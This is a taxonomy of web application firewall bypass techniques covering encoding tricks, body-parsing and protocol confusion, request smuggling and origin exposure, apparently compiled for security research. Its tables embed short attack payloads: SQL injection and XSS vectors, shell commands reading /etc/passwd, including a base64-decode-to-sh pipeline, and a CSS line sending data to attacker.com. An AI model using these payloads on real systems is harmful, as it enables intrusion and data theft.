# WAF (Web Application Firewall) Bypass — Mutation/Variation Taxonomy

---

## Classification Structure

This taxonomy organizes the entire WAF bypass attack surface along three orthogonal axes derived from systematic analysis of academic research, CVE databases, bug bounty disclosures, and practitioner writeups through 2025.

**Axis 1 — Mutation Target (Primary Structure):** *What structural component of the HTTP request or WAF architecture is being mutated?* This axis defines the top-level sections (§1–§9) and captures the specific element an attacker modifies to evade detection. Categories range from payload-level encoding transformations through protocol-level manipulations to architectural bypasses that circumvent the WAF entirely.

**Axis 2 — Discrepancy Type (Cross-Cutting):** *What kind of mismatch between the WAF and the backend does the mutation exploit?* Every successful WAF bypass fundamentally relies on a discrepancy — the WAF interprets the request one way, while the backend interprets it another. Understanding the discrepancy type explains *why* a given mutation works, independent of what was mutated.

**Axis 3 — Attack Scenario (Mapping):** *What attack payload is being delivered through the WAF bypass?* The bypass itself is transport-agnostic — it delivers a payload (SQLi, XSS, RCE, SSRF, path traversal, etc.) that the WAF would normally block. This axis is covered in the Attack Scenario Mapping section (§10).

### Discrepancy Type Summary (Axis 2)

| Discrepancy Type | Mechanism | Typical Bypass Categories |
|---|---|---|
| **Parser Differential** | WAF and backend parse the same bytes differently (boundary, charset, JSON, XML, multipart) | §2, §3, §5 |
| **Encoding Gap** | WAF fails to decode an encoding layer the backend processes (double-encoding, Unicode, charset, hex) | §1, §2 |
| **Normalization Mismatch** | WAF and backend apply normalization in different order or with different algorithms (URL decode before/after path split, Unicode NFK* forms) | §1, §4 |
| **Structural Blind Spot** | WAF does not inspect certain request locations (headers, JSON body, XML CDATA, multipart filenames) | §2, §5, §6 |
| **Rule Coverage Gap** | WAF rules are incomplete — missing keywords, functions, syntax variants, or entirely new attack grammars | §1, §6, §7 |
| **Architectural Bypass** | Request reaches the backend without passing through the WAF at all (origin IP, protocol upgrade, alternate endpoint) | §8, §9 |
| **Resource Exhaustion** | WAF's own detection logic is overwhelmed or degraded (ReDoS, payload size, connection flooding) | §7 |

### Fundamental Insight

WAFs occupy an inherently disadvantaged position: they must **parse and understand every possible representation** of a request as the backend would, yet they sit **outside** the backend's actual parsing pipeline. Any discrepancy in this shadow-parsing — whether in encoding, normalization order, content-type handling, protocol framing, or architectural routing — becomes a bypass vector. Research in 2025 confirms this: over 52% of exploit payloads bypass default WAF rules even under favorable conditions, and it takes an average of 41 days for a CVE-specific WAF rule to be published while exploit code appears within hours.

---

## §1. Payload Encoding & Character Transformation

Mutations that alter the representation of the attack payload itself — changing how characters are encoded, normalized, or expressed — so that the WAF's pattern-matching fails while the backend decodes the payload to its malicious canonical form.

### §1-1. URL Encoding Mutations

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Double URL Encoding** | Encode `%` as `%25`, creating payloads like `%253Cscript%253E`. WAF decodes once (sees `%3Cscript%3E`), backend decodes twice (sees `<script>`). | Backend performs a second round of URL decoding |
| **Partial/Selective Encoding** | Encode only certain characters (e.g., keywords) while leaving others unencoded, breaking the WAF's keyword signature match. | WAF matches on fully-decoded or fully-encoded patterns only |
| **Over-long UTF-8 Encoding** | Represent ASCII characters using multi-byte UTF-8 sequences (e.g., `%C0%AF` for `/`). Non-compliant decoders accept the overlong form. | Backend accepts non-shortest-form UTF-8 |
| **Mixed Encoding** | Combine URL encoding, HTML entities, and Unicode escapes in a single payload: `%3Cscr\u0069pt%3E`. | Backend normalizes all encoding layers; WAF handles only some |
| **Percent-Encoded Query Delimiter** | Encode `?` as `%3F` in the URL path. The WAF misidentifies where the query string begins, hiding payloads in the path component from path-specific rules (CVE-2024-1019). | WAF decodes percent-encoding before splitting path/query |

### §1-2. Unicode & Normalization Mutations

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Unicode Compatibility Equivalence** | Use Unicode characters that normalize to ASCII equivalents under NFKC/NFKD (e.g., `𝕃` → `L`, fullwidth `＜` → `<`). WAF sees the exotic codepoint; backend normalizes to the canonical attack character. | Backend applies NFKC/NFKD normalization after WAF inspection |
| **Homoglyph Substitution** | Replace Latin characters with visually similar characters from other scripts (Cyrillic `а` for Latin `a`). The WAF's regex fails to match the keyword while the backend may treat them equivalently. | Backend performs case-folding or script-agnostic comparison |
| **Unicode Escape Sequences** | Express payload characters as `\uXXXX` escapes inside JSON, JavaScript, or other contexts: `"\u003cscript\u003e"`. | WAF does not resolve JSON Unicode escapes before matching |
| **UTF-7 Encoding** | Declare `charset=utf-7` in the Content-Type or use dual charset declarations (`charset=utf-8;charset=utf-7`). Payload is Base64-encoded UTF-7 that the backend decodes. | Backend respects the charset declaration |
| **Combining/Zero-Width Characters** | Insert zero-width joiners (`\u200D`), zero-width spaces (`\u200B`), or combining marks within keywords. The WAF's string match fails; the backend strips or ignores these characters. | Backend normalizes or strips zero-width characters |

### §1-3. Alternative Encoding Systems

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **HTML Entity Encoding** | Use decimal (`&#60;`), hex (`&#x3C;`), or named (`&lt;`) entities in HTML/XML contexts. WAF inspects raw bytes; backend renders entities. | Response context is HTML/XML; WAF doesn't decode entities |
| **Hex/Octal/Binary Literals** | Express SQL strings as hex (`0x756E696F6E`), use `CHAR()` functions (`CHAR(83,69,76,69,67,84)`), or octal in shell commands. | Backend SQL/shell interpreter processes the literal form |
| **Base64 Encoding** | Encode payloads in Base64 within contexts where the backend decodes them (XML CDATA, JSON values, custom headers). | Application explicitly Base64-decodes user input |
| **IBM037/EBCDIC Charset** | Set Content-Type charset to `ibm037` or other exotic codepages. The WAF cannot decode the payload; the backend's framework handles the charset conversion. | Backend framework auto-detects and converts charsets |
| **JavaScript String Methods** | Use `String.fromCharCode()`, template literals, `atob()`, `eval()`, or concatenation (`'al'+'ert'`) to construct payloads at runtime. | XSS context where JavaScript is executed |

### §1-4. Case & Whitespace Mutations

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Random Case Alternation** | `SeLeCt`, `uNiOn`, `ScRiPt` — alternate upper/lower case to break case-sensitive regex rules. | WAF rules are not fully case-insensitive |
| **Comment Injection (SQL)** | Replace spaces with inline comments: `SELECT/**/username/**/FROM/**/users`. Null bytes (`%00`) can also act as terminators. | WAF splits tokens on whitespace only |
| **Whitespace Substitution** | Replace spaces with tabs (`%09`), newlines (`%0A`, `%0D`), vertical tabs (`%0B`), form feeds (`%0C`), or non-breaking spaces (`%A0`). | Backend treats various whitespace characters equivalently |
| **String Concatenation** | Break keywords across concatenation operators: `'sel'||'ect'`, `CONCAT('un','ion')`, or language-specific join operators. | Backend concatenates before execution |

---

## §2. Content-Type & Body Parsing Manipulation

Mutations that exploit how WAFs parse HTTP request bodies based on the Content-Type header. Different content types (JSON, XML, multipart/form-data, URL-encoded) have distinct parsing rules, and discrepancies between WAF parsers and backend framework parsers create a large bypass surface.

### §2-1. JSON-Based Evasion

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **JSON SQL Syntax** | Embed SQL operators within JSON syntax: `1' AND JSON_EXTRACT(data, '$.key')='value'--`. Many WAFs lack JSON-aware SQL detection entirely. | WAF does not parse JSON syntax within SQL context |
| **JSON Unicode Escapes** | Use `\uXXXX` within JSON string values to hide malicious characters. WAF inspects raw JSON bytes; backend JSON parser resolves escapes. | WAF does not decode JSON string escapes |
| **Nested JSON Structures** | Deeply nest objects/arrays to exceed WAF parsing depth limits: `{"a":{"b":{"c":{"d":"<payload>"}}}}`. | WAF has a recursion/depth limit on JSON parsing |
| **JSON with Comments** | Some JSON parsers (e.g., JSON5, JSONC) accept comments (`//`, `/* */`). Inject comments around keywords to break WAF pattern matching. | Backend uses a lenient JSON parser |
| **Content-Type Mismatch** | Send a JSON body with `Content-Type: application/x-www-form-urlencoded` or vice versa. The WAF parses according to the declared type; the backend auto-detects the actual format. | Backend framework auto-detects body format regardless of Content-Type |

### §2-2. XML-Based Evasion

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **XML Entity Encoding** | Wrap payloads in character entities (`&#x3C;script&#x3E;`) or define custom entities via internal DTD subset. WAF inspects raw XML; backend resolves entities. | WAF does not resolve XML entities before pattern matching |
| **CDATA Section Wrapping** | Place attack payload inside `<![CDATA[...]]>` blocks. Some WAFs skip CDATA content during inspection. | WAF treats CDATA as opaque text |
| **XML Namespace Confusion** | Declare custom namespaces that alter element name resolution. The WAF matches on the prefixed name; the backend resolves the namespace to the canonical element. | WAF does not perform namespace resolution |
| **XML Parameter Entities** | Use parameter entities (`%entity;`) in external DTD references to inject content the WAF cannot resolve at parse time. | Backend processes external entities |
| **XML Encoding Declaration** | Specify an encoding in the XML declaration (`<?xml encoding="UTF-16"?>`) that the WAF doesn't handle, causing it to misparse the body. | WAF supports only UTF-8 XML parsing |

### §2-3. Multipart/Form-Data Evasion

Multipart parsing is one of the richest bypass surfaces. Research in 2025 identified 351 distinct multipart-based bypasses across major WAFs, as no multipart parser fully complies with the RFC.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Boundary Manipulation** | Alter the boundary delimiter — remove leading `\r\n`, use quoted boundaries, add whitespace or extra hyphens. The WAF fails to identify part boundaries; the backend's parser is more tolerant. | WAF implements strict boundary matching |
| **Missing Closing Boundary** | Omit the closing boundary (`--boundary--`). Many backends accept the truncated multipart body; the WAF may reject or misparse it. | Backend accepts incomplete multipart messages |
| **Duplicate Content-Disposition** | Include multiple `Content-Disposition` headers in a single part with conflicting `name` values. The WAF inspects one; the backend uses the other. | WAF and backend disagree on header precedence |
| **Part-Level Charset Override** | Set a `charset` parameter on individual part headers, causing the WAF to decode the part differently than the backend. | Backend respects part-level charset declarations |
| **Filename/Field Injection** | Place payloads in the `filename` parameter of Content-Disposition, or use unusual field names that the WAF does not inspect. | WAF only inspects the `name` parameter, not `filename` |
| **Multipart within Multipart** | Nest a multipart body inside a multipart part (RFC 2046 allows this). Most WAFs do not recurse into nested multipart structures. | Backend framework handles nested multipart |
| **Extra Headers in Parts** | Add custom headers within multipart parts. Some WAFs only parse standard headers (Content-Disposition, Content-Type) and ignore others where payloads can hide. | Backend processes or reflects custom part headers |

### §2-4. Content-Type Confusion

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Type Switching** | Send a request with `Content-Type: application/json` but encode the body as `application/x-www-form-urlencoded`, or vice versa. The WAF applies the wrong parser. | Backend auto-negotiates body format |
| **Dual Charset Declaration** | Use `Content-Type: application/json; charset=utf-8; charset=utf-7`. The WAF uses the first charset; the backend uses the last (or vice versa). | WAF and backend disagree on charset precedence |
| **Unknown Content-Type** | Use a rare or invented Content-Type (`application/x-custom`). The WAF skips body inspection; the backend's framework may still parse it as form data or JSON. | WAF falls through to no-parse on unknown types |
| **Charset-Based Encoding Swap** | Declare `charset=ibm500` or `charset=shift_jis` to encode the payload in a character set the WAF cannot decode. | Backend converts from declared charset to UTF-8 |
| **Parameter Injection in Content-Type** | Add extra parameters to the Content-Type header (`boundary=X; evil=payload`) that interfere with the WAF's header parser. | WAF's Content-Type parser is fragile |

---

## §3. HTTP Protocol Structure Manipulation

Mutations that exploit ambiguities in HTTP protocol structure — how headers are parsed, how message boundaries are determined, and how connections are managed. These create discrepancies between front-end (WAF/proxy) and backend interpretations.

### §3-1. Request Smuggling (Framing Attacks)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **CL.TE Desync** | WAF/front-end uses `Content-Length`; backend uses `Transfer-Encoding: chunked`. The front-end forwards what it thinks is one request; the backend interprets the trailing bytes as the start of a second (smuggled) request. | Front-end prioritizes CL; backend prioritizes TE |
| **TE.CL Desync** | Inverse: front-end uses `Transfer-Encoding`; backend uses `Content-Length`. The smuggled request is embedded after the chunked terminator. | Front-end prioritizes TE; backend prioritizes CL |
| **TE.TE Desync (Obfuscated TE)** | Both sides support `Transfer-Encoding`, but one fails to parse an obfuscated TE header (`Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked`, `Transfer-Encoding\t: chunked`). The side that fails falls back to `Content-Length`. | Different TE header parsing strictness |
| **0.CL Desync** | Front-end treats the request as having no body (no CL, no TE); backend reads `Content-Length` bytes. Creates a deadlock broken by early-response gadgets — endpoints that respond before consuming the full body (static files, redirects, `Expect: 100-continue`). | Backend reads CL on requests the front-end considers bodyless |
| **Chunk Extension Abuse** | Append extensions to chunk headers (`a;extension=value\r\n`). Inconsistent handling of extensions between WAF and backend causes framing disagreement. CVE-2025-55315 (ASP.NET Core, CVSS 9.9) demonstrated this with high severity. | WAF and backend handle chunk extensions differently |
| **Chunked Body with Trailer Headers** | Inject malicious headers in the trailer section after the final `0\r\n` chunk. Some backends merge trailer headers with request headers; the WAF may not inspect trailers. | Backend processes chunked trailer headers |

### §3-2. Header Manipulation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Header Injection in Non-Standard Locations** | Place payloads in headers the WAF doesn't inspect: `X-Forwarded-For`, `X-Originating-IP`, `Referer`, `User-Agent`, custom headers. Backend uses these headers in SQL queries or reflected output. | Backend trusts and processes non-standard headers |
| **Header Name Obfuscation** | Add whitespace, tabs, or line folding (obs-fold) in header names/values: `Transfer-Encoding\t: chunked`. Tolerant parsers accept the header; strict parsers reject it. | WAF and backend differ in header parsing strictness |
| **Duplicate Headers** | Send the same header multiple times with different values. RFC 7230 behavior varies: some implementations use the first, others the last, others concatenate. | WAF and backend disagree on duplicate header resolution |
| **Header Value Line Folding** | Use HTTP/1.1 obsolete line folding (`\r\n\t` or `\r\n `) to split a header value across lines. Modern parsers may not support this; legacy backends might. | Backend supports obs-fold; WAF does not |
| **Large Header / Many Headers** | Send an extremely large number of headers or very long header values to exceed the WAF's parsing buffer, causing it to truncate or skip header inspection. | WAF has header parsing size/count limits |

### §3-3. HTTP Method & Version Manipulation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Method Override** | Use `X-HTTP-Method-Override: PUT` or `X-Method-Override: DELETE` with a POST request. The WAF applies POST rules; the backend processes it as PUT/DELETE. | Backend framework respects method override headers |
| **Uncommon HTTP Methods** | Use methods like `PATCH`, `OPTIONS`, `TRACE`, `PROPFIND`. WAF rules may only cover GET/POST, allowing other methods to pass uninspected. | WAF rules are method-specific |
| **HTTP/0.9 Downgrade** | Send an HTTP/0.9 request (no headers, just `GET /path`). Some backends still support this; the WAF may not parse HTTP/0.9 requests. | Backend supports legacy HTTP/0.9 |

---

## §4. URL & Path Manipulation

Mutations targeting the URL structure — path, query string, and fragment — to evade WAF rules that match on specific URL patterns.

### §4-1. Path Normalization Discrepancies

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Path Traversal Sequences** | Insert `../` or encoded variants (`%2e%2e%2f`, `..%5c`) to reach protected paths while evading path-based WAF rules. | WAF normalizes paths differently than the backend/OS |
| **Double Slash Collapse** | Use `//admin//secret` — some normalizers collapse double slashes; others preserve them. WAF matches on the raw path; backend normalizes. | Different slash-collapsing behavior |
| **Dot Segment Insertion** | Insert `/./` segments: `/admin/./secret`. The WAF may not normalize these; the backend resolves them. | WAF does not apply RFC 3986 path normalization |
| **Trailing Dot in Hostname** | Add a trailing dot to the hostname (`example.com.`). DNS treats this as equivalent; some WAF host-matching rules do not. | WAF host-based rules use exact string matching |
| **OS-Specific Path Semantics** | On Windows: use backslashes (`\`), 8.3 short names (`PROGRA~1`), ADS (`file.txt::$DATA`), case insensitivity. On certain file systems: use Unicode normalization of filenames. | Backend runs on an OS with alternative path semantics |
| **URL Path Parameter (Matrix)** | Use path parameters: `/admin;bypass=true/secret`. Some frameworks strip path parameters before routing; the WAF sees the full path including the parameter. | Backend framework strips path parameters |

### §4-2. Query String Manipulation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Parameter Order Shuffling** | Reorder query parameters. Some WAF rules match on specific parameter positions or early-terminating regex. | WAF regex is position-dependent |
| **Parameter Name Pollution** | Add decoy parameters with similar names (`username`, `user%6eame`, `user%00name`) to confuse WAF parameter extraction. | WAF and backend resolve parameter names differently |
| **Fragment Identifier Abuse** | On server-side: fragments (`#`) are normally stripped by clients, but in certain proxy configurations or custom parsers, fragment content may be forwarded to the backend. | Non-standard proxy/parser forwards fragment |

---

## §5. Parameter & Input Channel Manipulation

Mutations that exploit how parameters are extracted from the request, how duplicate parameters are handled, and which input channels the WAF inspects.

### §5-1. HTTP Parameter Pollution (HPP)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Duplicate Parameter — First vs. Last** | Send `id=1&id=2 UNION SELECT...`. If the WAF checks the first value and the backend uses the last (or vice versa), the malicious value evades inspection. | WAF and backend disagree on duplicate parameter precedence |
| **Parameter Splitting** | Split an attack payload across multiple parameters with the same name: `q=SEL&q=ECT`. If the backend concatenates them, the payload reconstructs; the WAF sees only fragments. | Backend concatenates same-name parameters |
| **Cross-Location Pollution** | Place part of the payload in the query string and part in the POST body. WAF may inspect only one location; the backend merges both sources. | Backend merges GET and POST parameters |
| **Array Parameter Abuse** | Use array notation (`id[]=1&id[]=malicious`) or JSON arrays in parameters. WAF may extract only scalar values; the backend processes the array. | Backend framework supports array parameters |

### §5-2. Alternate Input Channels

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Cookie Injection** | Place payloads in cookie values. Some WAFs do not fully inspect cookie contents or have reduced rule sets for cookies. | Backend reflects or processes cookie values |
| **Header-Based Payload Delivery** | Inject payloads via `Referer`, `User-Agent`, `X-Forwarded-Host`, or custom headers. WAF rules typically focus on URL, query, and body parameters. | Backend uses header values in SQL, templates, or logs |
| **File Upload Content** | Embed payloads within uploaded file content (SVG with JavaScript, CSV with formulas, XML with XXE). WAFs may not deeply parse uploaded file contents. | Backend processes uploaded file content |
| **WebSocket Messages** | After an initial HTTP upgrade handshake, subsequent WebSocket frames may not pass through the WAF's HTTP inspection engine. | WAF does not inspect WebSocket frame payloads |

---

## §6. Syntax & Grammar Evasion

Mutations that exploit the gap between what the WAF's rules recognize as malicious syntax and the full range of syntax the backend interpreter (SQL engine, JavaScript engine, shell, etc.) accepts.

### §6-1. SQL Injection Grammar Evasion

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Alternative SQL Functions** | Use `BENCHMARK()`, `SLEEP()`, `IF()`, `CASE WHEN`, `SUBSTRING()` instead of `UNION SELECT`. WAF rules focus on common keywords. | WAF rule set covers only standard SQL keywords |
| **Scientific Notation / Numeric Tricks** | Use `1e0UNION` or `1.0UNION` to merge a numeric literal with a keyword without whitespace. Some SQL parsers accept this; the WAF's tokenizer does not. | SQL parser accepts number-keyword concatenation |
| **JSON Operators in SQL** | Use database-specific JSON operators (`->`, `->>`, `JSON_EXTRACT()`, `@>`) to construct queries the WAF has no signatures for. | WAF lacks JSON SQL operator signatures |
| **Backtick / Bracket Quoting** | Use MySQL backticks (`` `select` ``), MSSQL brackets (`[select]`), or PostgreSQL double quotes (`"select"`) around keywords. WAF regex may not account for quoted identifiers. | WAF does not recognize quoted SQL identifiers |
| **Stacked Queries with Uncommon Delimiters** | Use `\g`, `\G`, or database-specific statement terminators instead of `;`. | Backend supports alternative statement terminators |
| **Stored Procedure / System Function Calls** | Call `xp_cmdshell`, `LOAD_FILE()`, `INTO OUTFILE`, or `pg_read_file()`. These bypass generic SQLi detection focused on SELECT/UNION patterns. | WAF rules focus on DML; miss system functions |

### §6-2. XSS Grammar Evasion

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Event Handler Diversity** | Use obscure event handlers: `onfocus`, `onpointerenter`, `onanimationend`, `ontoggle` instead of `onerror`/`onload`. | WAF blocklist covers only common event handlers |
| **Tag Diversity** | Use `<svg>`, `<math>`, `<details>`, `<marquee>`, `<video>`, `<audio>`, `<body>` instead of `<script>`. | WAF blocklist covers only `<script>` and common tags |
| **Alternative JS Execution Sinks** | Use `confirm()`, `prompt()`, `print()`, `top['al'+'ert'](1)`, or `Function('alert(1)')()` instead of `alert()`. | WAF blocks only `alert()` |
| **Template Literal Injection** | Use JavaScript template literals: `` `${alert(1)}` `` or framework template syntax (`{{constructor.constructor('alert(1)')()}}`). | WAF does not recognize template literal syntax |
| **SVG/MathML Namespace Bypass** | Embed JavaScript in SVG `<foreignObject>`, MathML `<annotation-xml>`, or use namespace confusion to bypass DOM sanitizers. | WAF/sanitizer does not handle SVG/MathML namespaces |
| **CSS-Based XSS** | Use `expression()` (legacy IE), `url()` with `javascript:`, or CSS injection to exfiltrate data via `background-image: url(attacker.com/?data=...)`. | Legacy browser or CSS injection context |

### §6-3. Command Injection Grammar Evasion

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Wildcard / Glob Substitution** | `cat /etc/pas?wd`, `cat /etc/p*d`, `c\at /et\c/pas\swd` — use shell wildcards and backslash-escaped characters. | WAF matches on exact command/path strings |
| **Variable Expansion** | `$u='cat';$v='/etc/passwd';$u $v` or `${IFS}` as whitespace substitute. | WAF does not model shell variable expansion |
| **Command Substitution** | `$(cat /etc/passwd)`, `` `cat /etc/passwd` ``, or `{cat,/etc/passwd}` (brace expansion). | WAF does not recognize command substitution syntax |
| **Encoding via Built-in Tools** | `echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh` or `printf '\x63\x61\x74'`. | WAF does not detect encoded command pipelines |

---

## §7. Rule Engine & Detection Logic Exploitation

Mutations that target the WAF's own detection engine — its regex patterns, processing limits, and ML model boundaries — rather than the HTTP parsing layer.

### §7-1. Regex / Pattern Matching Evasion

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **ReDoS (Regex Denial of Service)** | Send input that triggers catastrophic backtracking in the WAF's regex engine, causing CPU exhaustion. The WAF times out or fails open, allowing subsequent requests through. Cloudflare experienced a global outage from this in 2019. | WAF uses backtracking regex engine (PCRE) with vulnerable patterns |
| **Payload Fragmentation** | Split the attack payload across multiple request parameters, headers, or even multiple requests. No single fragment matches a WAF signature. | Backend reconstructs the payload from fragments |
| **Null Byte Injection** | Insert `%00` to terminate string matching in WAF rules written in C-based regex engines, while the backend's higher-level language ignores null bytes. | WAF regex engine uses null-terminated strings |
| **Comment/Whitespace Padding** | Pad payloads with excessive comments, whitespace, or no-op characters to push the actual attack past the WAF's inspection buffer size. | WAF has a maximum inspection size |
| **Polymorphic Payload Generation** | Use tools or scripts to automatically generate semantically equivalent but syntactically unique payloads for each request, defeating static signatures. | WAF relies on exact or near-exact signature matching |

### §7-2. ML-Based WAF Evasion

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Adversarial Feature Manipulation** | Guided mutation (e.g., WAF-A-MoLE) alters payload syntax — adding comments, changing case, inserting whitespace — to reduce the ML model's confidence score below the detection threshold while preserving malicious semantics. | WAF uses ML-based detection with a confidence threshold |
| **Reinforcement Learning Payload Generation** | RL agents (PPO, A2C-based) learn to generate evasive payloads through trial-and-error against target WAFs, achieving 80%+ bypass rates on ModSecurity (SQLi) and 97%+ on SafeLine (RCE). | Attacker has query access to the WAF's decisions |
| **Feature Space Exploitation** | Craft payloads that fall outside the training data distribution — novel syntax, rare encodings, unusual combination of benign and malicious tokens — to exploit blind spots in the model's learned feature space. | ML model's training data is incomplete |
| **Gradient-Based Evasion** | For WAFs using differentiable models, compute gradients to find minimal payload modifications that cross the decision boundary. Context-free grammar approaches can generate diverse payloads covering 18+ attack scenarios. | White-box or approximate gradient access |

### §7-3. Processing Limit Exploitation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Oversized Body** | Send a request body exceeding the WAF's maximum inspection size. The WAF inspects only the first N bytes; the payload is placed beyond the cutoff. | WAF has a body inspection size limit |
| **Excessive Nesting / Recursion** | Deeply nest JSON objects, XML elements, or multipart structures to exceed the WAF's recursion limit, causing it to skip deep content inspection. | WAF has a depth limit on structured content |
| **High Request Rate** | Flood the WAF with benign requests to exhaust its processing capacity, causing it to fail-open and pass subsequent malicious requests uninspected. | WAF is configured to fail-open under load |
| **Slow/Fragmented Delivery** | Send the payload extremely slowly (Slowloris-style) or as many small TCP fragments. Some WAFs time out or reassemble incorrectly. | WAF has timeouts or incomplete TCP reassembly |

---

## §8. Protocol Version & Upgrade Exploitation

Mutations that exploit HTTP protocol version differences, connection upgrades, and binary framing to bypass WAF inspection that is only effective for standard HTTP/1.1 text-based parsing.

### §8-1. HTTP/2 Downgrade Attacks

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **H2.CL / H2.TE Smuggling** | The WAF/front-end speaks HTTP/2 with the client but downgrades to HTTP/1.1 for the backend. During the translation, the front-end may generate `Content-Length` or `Transfer-Encoding` headers from HTTP/2 pseudo-headers inconsistently, enabling request smuggling. | Front-end downgrades HTTP/2 to HTTP/1.1 |
| **Header Injection via HTTP/2 Binary Framing** | HTTP/2 allows header values that would be invalid in HTTP/1.1 (containing `\r\n`). If the front-end doesn't sanitize during downgrade, headers can be injected into the HTTP/1.1 request. | Front-end does not sanitize headers during protocol downgrade |
| **HTTP/2 Pseudo-Header Abuse** | Manipulate `:method`, `:path`, `:authority` pseudo-headers in ways that the WAF's HTTP/2 parser does not validate but the backend accepts after downgrade. | WAF's HTTP/2 parsing is less strict than HTTP/1.1 parsing |

### §8-2. H2C (HTTP/2 Cleartext) Smuggling

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Connection Upgrade Bypass** | Send `Upgrade: h2c` with `Connection: Upgrade, HTTP2-Settings` to upgrade to cleartext HTTP/2. Once upgraded, the reverse proxy stops inspecting individual requests — routing, auth, and WAF rules are bypassed for all subsequent frames. | Reverse proxy forwards the Upgrade header to the backend |
| **Azure WAF Global Bypass** | In cloud WAF environments, if the initial upgrade request passes, all subsequent HTTP/2 frames bypass the WAF entirely, providing a full global bypass. | Cloud WAF does not strip the Upgrade header |

### §8-3. WebSocket & Protocol Upgrade

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **WebSocket Tunnel** | After upgrading to WebSocket, send malicious payloads in WebSocket frames. Most WAFs do not inspect WebSocket traffic. | WAF only inspects HTTP traffic, not WebSocket frames |
| **Cross-Protocol Smuggling** | Use `Upgrade` or `CONNECT` to establish a tunnel through the WAF, then send arbitrary protocols (including raw HTTP to internal services) through the tunnel. | WAF allows protocol upgrade/tunneling |

---

## §9. Architectural & Network-Level Bypass

Bypasses that avoid the WAF entirely by reaching the origin server through alternative network paths, exploiting misconfigured architectures, or leveraging the deployment topology.

### §9-1. Origin IP Exposure

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **DNS History / Certificate Transparency** | Discover the origin server's real IP address through historical DNS records, CT logs, or SSL certificate scans (Censys, Shodan). Send requests directly to the origin IP, bypassing the CDN/WAF entirely. | Origin server accepts connections from non-CDN IPs |
| **Subdomain/Service Enumeration** | Find subdomains or related services (mail, FTP, API) that resolve to the origin IP and are not fronted by the WAF. | Not all services are behind the WAF |
| **Information Disclosure** | The origin IP leaks through error pages, debug headers (`X-Backend-Server`), email headers (`Received`), or SSRF responses. | Application or infrastructure leaks origin information |
| **BreakingWAF Misconfiguration** | CDN/WAF providers that also act as CDN (Cloudflare, Akamai, Fastly, Imperva) share IP ranges. If the origin doesn't restrict incoming connections to the WAF's IP range, any attacker who discovers the origin IP can bypass the WAF. Impacts 40%+ of CDN/WAF-protected sites. | Origin server does not whitelist WAF provider IP ranges |

### §9-2. Alternate Endpoint & Routing Bypass

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **API Endpoint Disparity** | Access GraphQL (`/graphql`), REST API, or internal API endpoints that are not covered by WAF rules. GraphQL is particularly vulnerable because all queries go to a single URL, defeating URL-pattern-based rules. | WAF rules don't cover all API endpoints |
| **Backend Administrative Interfaces** | Access `/admin`, `/debug`, `/actuator`, `/server-status`, or framework-specific management endpoints that bypass or have reduced WAF rules. | Management endpoints have weaker WAF coverage |
| **Server-Side Request Forgery (SSRF)** | Trigger the application to make internal requests to itself or other backend services, bypassing the WAF which only sits on the external perimeter. | Application has SSRF vulnerabilities |
| **IPv6 vs. IPv4 Disparity** | If the WAF is configured only for IPv4, accessing the backend via its IPv6 address may bypass WAF inspection. | WAF is not configured for IPv6 traffic |

### §9-3. IP & Network-Level Evasion

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **IP Rotation / Residential Proxies** | Use large pools of rotating residential, mobile, or ISP-grade IP addresses to distribute malicious requests and evade IP reputation–based blocking. | WAF relies on IP reputation or rate limiting |
| **TOR / VPN / Cloud Function Egress** | Route requests through TOR, VPN services, or serverless function IP ranges (AWS Lambda, GCP Cloud Functions) that have clean reputations. | WAF uses IP-based blocklists |
| **Geographic IP Selection** | Use IP addresses from geographic regions that the WAF is configured to allow, bypassing geo-blocking rules. | WAF has geography-based allow/deny rules |

---

## §10. Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories |
|---|---|---|
| **SQL Injection Delivery** | WAF + SQL backend (MySQL, PostgreSQL, MSSQL) | §1 (encoding) + §2 (JSON/XML body) + §5 (HPP) + §6-1 (SQL grammar) |
| **XSS Delivery** | WAF + reflected/stored output context | §1 (Unicode, encoding) + §6-2 (tag/event diversity) + §5-2 (alternate channels) |
| **RCE / Command Injection** | WAF + shell/OS command execution | §1 (encoding) + §6-3 (shell grammar) + §2-3 (multipart upload) |
| **SSRF Delivery** | WAF + internal network access | §4 (URL manipulation) + §9-2 (routing bypass) + §1 (encoding) |
| **Path Traversal / LFI** | WAF + filesystem access | §4-1 (path normalization) + §1-1 (double encoding) + §3-2 (header injection) |
| **Authentication Bypass** | WAF-fronted auth middleware | §3-1 (request smuggling) + §8 (protocol upgrade) + §9-2 (admin endpoints) |
| **Cache Poisoning** | WAF + CDN cache | §3-1 (smuggling) + §3-2 (header manipulation) + §4 (path confusion) |
| **WAF Denial of Service** | WAF itself as target | §7-1 (ReDoS) + §7-3 (processing limits) + §9-3 (IP flooding) |
| **Data Exfiltration** | WAF on egress/response | §6-1 (blind SQLi) + §6-2 (CSS exfil) + §5-2 (WebSocket) |
| **API Abuse (GraphQL/REST)** | WAF + API gateway | §2-1 (JSON evasion) + §9-2 (endpoint disparity) + §5-1 (HPP) |

---

